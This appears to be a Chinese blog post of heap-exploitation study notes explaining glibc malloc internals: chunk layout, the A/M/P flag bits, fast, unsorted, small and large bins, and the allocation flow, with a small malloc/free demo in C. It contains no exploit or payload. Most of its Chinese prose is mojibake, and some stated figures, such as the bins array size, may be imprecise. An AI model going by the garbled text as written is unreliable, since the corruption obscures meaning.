<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *H;</span><br><span class="line">    H = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(H,<span class="string">"aaaaaaaaaaaaaaaa"</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">free</span>(H);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">gcc -o a.out a.c#<span class="number">64</span>ä½</span><br><span class="line">gcc -m32 -o b.out b.c#<span class="number">32</span>ä½</span><br></pre></td></tr></table></figure>
<p>64ä½</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201212004040135.png" alt="image-20201212004040135"></p>
<p>32ä½</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201212004126045.png" alt="image-20201212004126045"></p>
<blockquote>
<p><strong>å½“å‰chunkå¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼š</strong></p>
<ul>
<li>fdï¼šä»fdå­—æ®µå¼€å§‹çš„æ˜¯ç”¨æˆ·çš„æ•°æ®</li>
</ul>
<p><strong>å½“å‰chunkå¤„äºç©ºé—²æ—¶ï¼š</strong></p>
<p>å› ä¸ºchunkå¤„äºç©ºé—²æ—¶ï¼Œä¼šè¢«æ”¾åˆ°biné“¾ä¸­ï¼Œæ‰€ä»¥fdå’Œbkç”¨äºæŒ‡å‘è‡ªå·±æ‰€åœ¨biné“¾ä¸­å‰åçš„ç©ºé—²chunk</p>
<ul>
<li>fdï¼šæŒ‡å‘å‰ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunkçš„æŒ‡é’ˆï¼ˆå¤´æŒ‡é’ˆï¼‰</li>
<li>bkï¼šæŒ‡å‘åä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunkçš„æŒ‡é’ˆ</li>
<li>é€šè¿‡fdå’Œbkå¯ä»¥å°†ç©ºé—²çš„chunkå—åŠ å…¥åˆ°ç©ºé—²çš„chunkå—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</li>
</ul>
<p><strong>fd_nextsizeã€bk_nextsize</strong></p>
<p>ä¹Ÿæ˜¯åªæœ‰chunkç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„chunkï¼ˆlarge chunkï¼‰</p>
<ul>
<li>fd_nextsizeï¼šæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«binçš„å¤´æŒ‡é’ˆ</li>
<li>bk_nextsizeï¼šæŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</li>
</ul>
<p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†</p>
</blockquote>
<h5 id="malloc-chunkçš„å†…å­˜åˆ†é…å¤§å°"><a href="#malloc-chunkçš„å†…å­˜åˆ†é…å¤§å°" class="headerlink" title="malloc_chunkçš„å†…å­˜åˆ†é…å¤§å°"></a>malloc_chunkçš„å†…å­˜åˆ†é…å¤§å°</h5><p><strong>æœ€å°çš„ç©ºé—´ï¼š</strong>mchunk_prev_sizeå­—æ®µ + mchunk_sizeå­—æ®µ + fdå­—æ®µ + bkå­—æ®µ æ‰€éœ€è¦çš„ç©ºé—´ã€‚æ‰€ä»¥64ä½ç³»ç»Ÿæœ€ä½éœ€è¦ 4 * SIZE_SZ = 32å­—èŠ‚ï¼›32ä½ç³»ç»Ÿæ˜¯16å­—èŠ‚</p>
<p><strong>å®é™…ç©ºé—´ï¼š</strong>mallocå¤§å° + chunkå¯¹é½è§„åˆ™ + mchunk_prev_sizeå­—æ®µ + mchunk_sizeå­—æ®µ + ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeæˆå‘˜ç©ºé—´</p>
<p>chunkçš„æ•°æ®ç»“æ„å¤§å°çš„å›¾ï¼ˆ64ä½ç³»ç»Ÿï¼‰</p>
<p><img src="/2020/12/15/%E5%A0%86/20201106174934849.jpg" alt="img"></p>
<h5 id="mchunk-sizeçš„æ ‡è®°ä½çš„å¤ç”¨"><a href="#mchunk-sizeçš„æ ‡è®°ä½çš„å¤ç”¨" class="headerlink" title="mchunk_sizeçš„æ ‡è®°ä½çš„å¤ç”¨"></a>mchunk_sizeçš„æ ‡è®°ä½çš„å¤ç”¨</h5><p>mchunk_sizeåœ¨64ä½ç³»ç»Ÿä¸‹æ˜¯8ä¸ªå­—èŠ‚ï¼Œå­—æ®µçš„æœ€åä¸‰ä¸ªbitä½ï¼Œå¤ç”¨ç”¨ä½œäº†ï¼ˆAMPï¼‰çš„æ ‡è®°ä½ç½®ã€‚åä¸‰ä½bitä½çš„å¤ç”¨ï¼Œä¸ä¼šå½±å“sizeçš„æ•°æ®å¤§å°</p>
<ul>
<li>Aï¼šA=0 ä¸ºä¸»åˆ†åŒºåˆ†é…ï¼ŒA=1 ä¸ºéä¸»åˆ†åŒºåˆ†é…ï¼Œå‚è§åé¢</li>
<li>Mï¼šM=1è¡¨ç¤ºä½¿ç”¨mmapæ˜ å°„åŒºåŸŸï¼ŒM=0ä¸ºä½¿ç”¨heapåŒºåŸŸ</li>
<li>Pï¼šP=0 è¡¨ç¤ºpre_chunkç©ºé—²ï¼Œmchunk_prev_sizeæ‰æœ‰æ•ˆ</li>
</ul>
<h3 id="0x04-chunkçš„åˆ†ç±»"><a href="#0x04-chunkçš„åˆ†ç±»" class="headerlink" title="0x04 chunkçš„åˆ†ç±»"></a>0x04 chunkçš„åˆ†ç±»</h3><h4 id="1-allocated-chunk"><a href="#1-allocated-chunk" class="headerlink" title="1.allocated chunk"></a>1.allocated chunk</h4><p>å½“å‰chunkæ˜¯è¢«åº”ç”¨å±‚ç”¨æˆ·æ‰€ä½¿ç”¨çš„</p>
<h4 id="2-free-chunk"><a href="#2-free-chunk" class="headerlink" title="2.free chunk"></a>2.free chunk</h4><p>å½“å‰chunkæ˜¯ç©ºé—²çš„ï¼Œæ²¡æœ‰è¢«åº”ç”¨å±‚ç”¨æˆ·æ‰€ä½¿ç”¨</p>
<h4 id="3-top-chunk"><a href="#3-top-chunk" class="headerlink" title="3.top chunk"></a>3.<strong>top chunk</strong></h4><ul>
<li><strong>æ¦‚å¿µï¼š</strong>å½“ä¸€ä¸ªchunkå¤„äºä¸€ä¸ªarenaçš„æœ€é¡¶éƒ¨(å³æœ€é«˜å†…å­˜åœ°å€å¤„)çš„æ—¶å€™ï¼Œå°±ç§°ä¹‹ä¸ºtop chunk</li>
<li><strong>ä½œç”¨ï¼š</strong>è¯¥chunkå¹¶<strong>ä¸å±äºä»»ä½•</strong>binï¼Œè€Œæ˜¯åœ¨ç³»ç»Ÿå½“å‰çš„æ‰€æœ‰free chunk(æ— è®ºé‚£ç§bin)éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°çš„æ—¶å€™ï¼Œå°†æ­¤chunkå½“åšä¸€ä¸ªåº”æ€¥æ¶ˆé˜²å‘˜ï¼Œåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨</li>
<li><strong>åˆ†é…çš„è§„åˆ™ï¼š</strong>å¦‚æœtop chunkçš„å¤§å°æ¯”ç”¨æˆ·è¯·æ±‚çš„å¤§å°è¦å¤§çš„è¯ï¼Œå°±å°†è¯¥top chunkåˆ†ä½œä¸¤éƒ¨åˆ†ï¼š1ï¼‰ç”¨æˆ·è¯·æ±‚çš„chunkï¼›2ï¼‰å‰©ä½™çš„éƒ¨åˆ†æˆä¸ºæ–°çš„top chunkã€‚å¦åˆ™ï¼Œå°±éœ€è¦æ‰©å±•heapæˆ–åˆ†é…æ–°çš„heapäº†â€”â€”åœ¨main arenaä¸­é€šè¿‡sbrkæ‰©å±•heapï¼Œè€Œåœ¨thread arenaä¸­é€šè¿‡mmapåˆ†é…æ–°çš„heap</li>
</ul>
<h4 id="4-last-remainder-chunk"><a href="#4-last-remainder-chunk" class="headerlink" title="4.last remainder chunk"></a>4.last remainder chunk</h4><ul>
<li><strong>å®ƒæ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼š</strong>å½“ç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binã€unsorted binæ»¡è¶³çš„æ—¶å€™ï¼Œå°±é€šè¿‡binmapséå†binæŸ¥æ‰¾æœ€åˆé€‚çš„chunkï¼Œå¦‚æœè¯¥chunkæœ‰å‰©ä½™éƒ¨åˆ†çš„è¯ï¼Œå°±å°†è¯¥å‰©ä½™éƒ¨åˆ†å˜æˆä¸€ä¸ªæ–°çš„chunkåŠ å…¥åˆ°unsorted binä¸­ï¼Œå¦å¤–ï¼Œ<strong>å†å°†è¯¥æ–°çš„chunkå˜æˆæ–°çš„last remainder chunk</strong></li>
<li><strong>å®ƒçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼š</strong>æ­¤ç±»å‹çš„chunkç”¨äºæé«˜è¿ç»­malloc(small chunk)çš„æ•ˆç‡ï¼Œä¸»è¦æ˜¯æé«˜å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§ã€‚é‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆæé«˜å±€éƒ¨æ€§çš„å‘¢ï¼Ÿä¸¾ä¾‹è¯´æ˜ã€‚å½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binæ»¡è¶³ï¼Œé‚£ä¹ˆå°±è½¬è€Œäº¤ç”±unsorted binå¤„ç†ã€‚åŒæ—¶ï¼Œå‡è®¾å½“å‰unsorted binä¸­åªæœ‰ä¸€ä¸ªchunkçš„è¯â€”â€”å°±æ˜¯last remainder chunkï¼Œé‚£ä¹ˆå°±å°†è¯¥chunkåˆ†æˆä¸¤éƒ¨åˆ†ï¼šå‰è€…åˆ†é…ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†æ”¾åˆ°unsorted binä¸­ï¼Œå¹¶æˆä¸ºæ–°çš„last remainder chunkã€‚è¿™æ ·å°±ä¿è¯äº†è¿ç»­malloc(small chunk)ä¸­ï¼Œå„ä¸ªsmall chunkåœ¨å†…å­˜åˆ†å¸ƒä¸­æ˜¯ç›¸é‚»çš„ï¼Œå³æé«˜äº†å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§</li>
</ul>
<h3 id="0x05-binsåˆ†ç±»"><a href="#0x05-binsåˆ†ç±»" class="headerlink" title="0x05 binsåˆ†ç±»"></a>0x05 binsåˆ†ç±»</h3><blockquote>
<ul>
<li>binæ˜¯ä¸€ä¸ªç”±struct chunkç»“æ„ä½“ç»„æˆçš„é“¾è¡¨</li>
<li>å‰é¢ä»‹ç»è¿‡ï¼Œä¸åŒçš„chunkæ ¹æ®ç‰¹ç‚¹ä¸åŒåˆ†ä¸ºä¸åŒçš„chunkï¼Œä¸ºäº†å°†è¿™äº›chunkè¿›è¡Œåˆ†ç±»çš„ç®¡ç†ï¼Œglibcé‡‡ç”¨äº†biné“¾è¿™ç§æ–¹å¼ç®¡ç†ä¸åŒçš„chunk</li>
<li>ä¸åŒçš„biné“¾æ˜¯ç”±arenaç®¡ç†çš„</li>
<li>biné“¾ä¸­çš„chunkå‡ä¸ºfree chunk</li>
</ul>
</blockquote>
<h4 id="1-binçš„malloc-state"><a href="#1-binçš„malloc-state" class="headerlink" title="1.binçš„malloc_state"></a>1.binçš„malloc_state</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>fastbinYæ•°ç»„ï¼š</strong>å¤§å°ä¸º10ã€‚è®°å½•çš„æ˜¯fast biné“¾</li>
<li><strong>binsæ•°ç»„ï¼š</strong>å¤§å°ä¸º129ã€‚è®°å½•çš„æ˜¯unsorted binï¼ˆ1ï¼‰ã€small binï¼ˆ2~63ï¼‰ã€large biné“¾ï¼ˆ64~126ï¼‰</li>
</ul>
<h4 id="2-fastbin"><a href="#2-fastbin" class="headerlink" title="2.fastbin"></a>2.fastbin</h4><p><strong>æ¦‚å¿µï¼š</strong>chunkçš„å¤§å°åœ¨32å­—èŠ‚åˆ°128å­—èŠ‚ï¼ˆ0x20~0x80ï¼‰çš„chunkç§°ä¸ºâ€œfast chunkï¼ˆå¤§å°ä¸æ˜¯mallocæ—¶çš„å¤§å°ï¼Œè€Œæ˜¯åœ¨å†…å­˜ä¸­struct malloc_chunkçš„å¤§å°ï¼ŒåŒ…å«å‰2ä¸ªæˆå‘˜ï¼‰</p>
<ul>
<li>fast biné“¾è¡¨çš„ä¸ªæ•°ä¸º10ä¸ª</li>
<li><strong>ä¸ä¼šå¯¹free chunkè¿›è¡Œåˆå¹¶ï¼š</strong>é‰´äºè®¾è®¡fast binçš„åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„å°å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤ç³»ç»Ÿå°†å±äº<strong>fast binçš„chunkçš„PREV_INUSEä½æ€»æ˜¯è®¾ç½®ä¸º1</strong>ï¼Œè¿™æ ·å³ä½¿å½“fast binä¸­æœ‰æŸä¸ªchunkåŒä¸€ä¸ªfree chunkç›¸é‚»çš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆå¹¶æ“ä½œï¼Œè€Œæ˜¯ä¿ç•™ä¸¤è€…ã€‚è™½ç„¶è¿™æ ·åšå¯èƒ½ä¼šé€ æˆé¢å¤–çš„ç¢ç‰‡åŒ–é—®é¢˜ï¼Œä½†ç‘•ä¸æ©ç‘œ</li>
<li>LIFO</li>
</ul>
<blockquote>
<h3 id="fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š"><a href="#fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š" class="headerlink" title="fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š"></a>fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š</h3><ul>
<li>æ¯ä¸ªfast biné“¾è¡¨éƒ½æ˜¯å•é“¾è¡¨ï¼ˆä½¿ç”¨fdæŒ‡é’ˆï¼‰ã€‚å› æ­¤ï¼Œfast binä¸­æ— è®ºæ˜¯æ·»åŠ è¿˜æ˜¯ç§»é™¤fast chunkï¼Œéƒ½æ˜¯å¯¹â€œé“¾è¡¨å°¾â€è¿›è¡Œæ“ä½œï¼Œè€Œä¸ä¼šå¯¹æŸä¸ªä¸­é—´çš„fast chunkè¿›è¡Œæ“ä½œ</li>
<li>å•ä¸ªfastbiné“¾è¡¨ä¸­çš„chunkå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ªfastbiné“¾è¡¨ä¸­çš„chunkå¤§å°æ˜¯ä¸åŒçš„</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/2019072416485849.png" alt="img"></p>
</blockquote>
<h4 id="3-unsorted-bin"><a href="#3-unsorted-bin" class="headerlink" title="3.unsorted bin"></a>3.unsorted bin</h4><p>å½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œå¦‚æœç³»ç»Ÿæ²¡æœ‰å°†å®ƒä»¬æ·»åŠ åˆ°å¯¹åº”çš„binsä¸­ï¼Œç³»ç»Ÿå°±å°†è¿™äº›chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚åœ¨å †ç®¡ç†å™¨çš„unsorted bin ä¸ä¸ºç©ºæ—¶ï¼Œ<strong>ç”¨æˆ·ç”³è¯·éfast binå¤§å°çš„å†…å­˜</strong>ä¼šå…ˆä»unsorted binä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°ç¬¦åˆè¯¥ç”³è¯·å¤§å°è¦æ±‚çš„chunkï¼Œåˆ™ç›´æ¥åˆ†é…æˆ–åˆ†å‰²è¯¥chunkã€‚</p>
<ul>
<li>unsorted binçš„ä¸ªæ•°ï¼š 1ä¸ª</li>
<li>unsorted binæ˜¯ä¸€ä¸ªç”±free chunksç»„æˆçš„å¾ªç¯åŒé“¾è¡¨</li>
<li>åœ¨unsorted binä¸­ï¼Œå¯¹chunkçš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„chunkéƒ½å¯ä»¥å½’å±åˆ°unsorted binä¸­</li>
<li>unsortedbiné‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</li>
</ul>
<p><img src="file://C:\Users\86138\Music\hexo\source\_posts\PWNå­¦ä¹ \image-20201119163232880.png?lastModify=1607780072" alt="image-20201119163232880"></p>
<h4 id="4-small-bin"><a href="#4-small-bin" class="headerlink" title="4.small bin"></a>4.small bin</h4><p><strong>æ¦‚å¿µ</strong>ï¼šå°äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunkç§°ä¹‹ä¸ºsmall chunkï¼Œsmall binå°±æ˜¯ç”¨äºç®¡ç†small chunkçš„</p>
<ul>
<li>small biné“¾è¡¨çš„ä¸ªæ•°ä¸º62ä¸ª</li>
<li>FIFO</li>
<li><strong>å¾ªç¯åŒå‘é“¾è¡¨</strong>ï¼Œå°±å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾é€Ÿåº¦è€Œè¨€ï¼Œsmall binæ¯”larger binå¿«ï¼Œä½†æ¯”fast binæ…¢</li>
</ul>
<blockquote>
<p><strong>Small biné“¾è¡¨</strong></p>
<ul>
<li>æ¯ä¸ªsmallbinä¹Ÿæ˜¯ä¸€ä¸ªç”±å¯¹åº”free chunkç»„æˆçš„å¾ªç¯åŒé“¾è¡¨</li>
<li><strong>small biné‡‡ç”¨FIFO(å…ˆå…¥å…ˆå‡º)ç®—æ³•ï¼š</strong>å†…å­˜é‡Šæ”¾æ“ä½œå°±å°†æ–°é‡Šæ”¾çš„chunkæ·»åŠ åˆ°é“¾è¡¨çš„front end(å‰ç«¯)ï¼Œåˆ†é…æ“ä½œå°±ä»é“¾è¡¨çš„rear end(å°¾ç«¯)ä¸­è·å–chunk</li>
<li>å•ä¸ªsmallbiné“¾è¡¨ä¸­çš„chunkå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ªsmallbiné“¾è¡¨ä¸­çš„chunkå¤§å°æ˜¯ä¸åŒçš„ï¼Œè·ŸfastbinsYæ•°ç»„å­˜å‚¨fastbiné“¾çš„åŸç†æ˜¯ç›¸åŒçš„</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/201907300808254.png" alt="img"></p>
</blockquote>
<h4 id="5-large-bin"><a href="#5-large-bin" class="headerlink" title="5.large bin"></a>5.large bin</h4><p><strong>æ¦‚å¿µï¼š</strong>å¤§äºç­‰äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunkç§°ä¹‹ä¸ºlarge chunkï¼Œlarge binå°±æ˜¯ç”¨äºç®¡ç†è¿™äº›largechunkçš„</p>
<ul>
<li>large biné“¾è¡¨çš„ä¸ªæ•°ä¸º63ä¸ªï¼Œè¢«åˆ†ä¸º6ç»„</li>
<li>largechunkä½¿ç”¨fd_nextsizeã€bk_nextsizeè¿æ¥èµ·æ¥çš„</li>
</ul>
<blockquote>
<h3 id="Large-Biné“¾è¡¨"><a href="#Large-Biné“¾è¡¨" class="headerlink" title="Large Biné“¾è¡¨"></a>Large Biné“¾è¡¨</h3><ul>
<li>åŒä¸€ä¸ªlargebinä¸­æ¯ä¸ªchunkçš„å¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œè¿™äº›chunkæ ¹æ®ä¸€å®šçš„èŒƒå›´å­˜å‚¨åœ¨ä¸€ä¸ªlarbiné“¾è¡¨ä¸­</li>
<li>large chunkå¯ä»¥æ·»åŠ ã€åˆ é™¤åœ¨large binçš„ä»»ä½•ä¸€ä¸ªä½ç½®</li>
<li><strong>åœ¨è¿™63ä¸ªlargebinsä¸­ï¼š</strong>ç¬¬ä¸€ç»„çš„32ä¸ªlargebiné“¾<strong>ä¾æ¬¡ä»¥64å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ªlargebiné“¾ä¸­chunksizeä¸º1024-1087å­—èŠ‚ï¼Œç¬¬äºŒä¸ªlarge binä¸­chunk sizeä¸º1088~1151å­—èŠ‚ã€‚</strong>ç¬¬äºŒç»„çš„16ä¸ªlargebiné“¾<strong>ä¾æ¬¡ä»¥512å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›</strong>ç¬¬ä¸‰ç»„çš„8ä¸ªlargebiné“¾<strong>ä»¥æ­¥é•¿4096ä¸ºé—´éš”ï¼›</strong>ç¬¬å››ç»„çš„4ä¸ªlargebiné“¾<strong>ä»¥32768å­—èŠ‚ä¸ºé—´éš”ï¼›</strong>ç¬¬äº”ç»„çš„2ä¸ªlargebiné“¾<strong>ä»¥262144å­—èŠ‚ä¸ºé—´éš”ï¼›</strong>æœ€åä¸€ç»„**çš„largebiné“¾ä¸­çš„chunkå¤§å°æ— é™åˆ¶</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/20190730154304263.png" alt="img"></p>
</blockquote>
<p><img src="/2020/12/15/%E5%A0%86/20190724174830502.png" alt="img"></p>
<h3 id="0x06-å †çš„è°ƒç”¨æµç¨‹"><a href="#0x06-å †çš„è°ƒç”¨æµç¨‹" class="headerlink" title="0x06 å †çš„è°ƒç”¨æµç¨‹"></a>0x06 å †çš„è°ƒç”¨æµç¨‹</h3><p><img src="/2020/12/15/%E5%A0%86/20190722153928310.png" alt="img"></p>
<ul>
<li><h4 id="å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š"><a href="#å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š" class="headerlink" title="å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š"></a>å½“åº”ç”¨ç¨‹åº<strong>â€œç¬¬ä¸€æ¬¡â€</strong>ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š</h4></li>
<li><p>glibcç”³è¯·åˆ°è¿™å—å¤§çš„å†…å­˜ä¹‹åï¼Œæ ¹æ®mallocéœ€è¦çš„å¤§å°ï¼Œç„¶ååˆ‡å‰²ç›¸åº”çš„å¤§å°ç»™åº”ç”¨ç¨‹åºmallocå‡½æ•°ä½¿ç”¨</p>
</li>
<li><p>å½“åº”ç”¨å±‚freeä¹‹åï¼Œä¼šå°†åˆšæ‰ä½¿ç”¨åˆ°çš„åŠ¨æ€å†…å­˜è¿”å›ç»™glibcï¼Œä½†æ˜¯è¿”å›çš„å†…å­˜ä¸æ˜¯è¿”å›ç»™top chunkï¼Œè€Œæ˜¯ç”±binsé“¾ç®¡ç†</p>
</li>
<li><p>å½“ç¨‹åºå†æ¬¡mallocæ—¶ï¼Œä¼šä»åˆšæ‰ç”³è¯·çš„å¾ˆå¤§çš„åŠ¨æ€å†…å­˜å»å–ï¼Œä¸ä¼šå†å»å‘å†…æ ¸ç”³è¯·å†…å­˜</p>
</li>
<li><p>åªæœ‰å½“ç¬¬ä¸€æ¬¡ç”³è¯·çš„åŠ¨æ€å†…å­˜ä½¿ç”¨å®Œæ—¶ï¼Œglibcæ‰ä¼šå†æ¬¡é€šè¿‡brk/mmapç³»ç»Ÿè°ƒç”¨å‘å†…æ ¸å»è¦å†…å­˜</p>
</li>
</ul>
<h3 id="0x07-chunkçš„æ ‡å¿—ä½"><a href="#0x07-chunkçš„æ ‡å¿—ä½" class="headerlink" title="0x07 chunkçš„æ ‡å¿—ä½"></a>0x07 chunkçš„æ ‡å¿—ä½</h3><h4 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h4><ul>
<li><strong>NON_MAIN_ARENAï¼š</strong>è®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹</li>
<li><strong>IS_MAPPEDï¼š</strong>è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapåˆ†é…çš„</li>
<li><strong>PREV_INUSEï¼š</strong>å¦‚æœå‰é¢ä¸€ä¸ªchunkå¤„äºåˆ†é…çŠ¶æ€ï¼Œé‚£ä¹ˆæ­¤ä½ä¸º1ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ªchunk çš„size çš„Pä½ä¸º0æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—²chunkä¹‹é—´çš„åˆå¹¶</li>
</ul>
<h4 id="2-å®ç°"><a href="#2-å®ç°" class="headerlink" title="2.å®ç°"></a>2.å®ç°</h4><ul>
